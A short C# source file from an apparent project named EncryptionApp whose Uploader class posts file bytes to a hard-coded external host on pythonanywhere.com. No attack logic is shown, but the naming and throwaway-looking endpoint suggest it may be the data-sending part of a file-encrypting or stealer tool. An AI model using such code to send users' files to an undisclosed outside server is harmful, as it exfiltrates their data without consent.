using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;

namespace EncryptionApp
{
    public static class Uploader
    {
        private static readonly HttpClient httpClient = new HttpClient();

        public static async Task UploadFileAsync(byte[] data, string fileName)
        {
            using (var content = new MultipartFormDataContent())
            {
                content.Add(new ByteArrayContent(data), "file", fileName);
                var response = await httpClient.PostAsync("https://anotheraccount254.pythonanywhere.com", content);
                response.EnsureSuccessStatusCode();
            }
        }
    }
}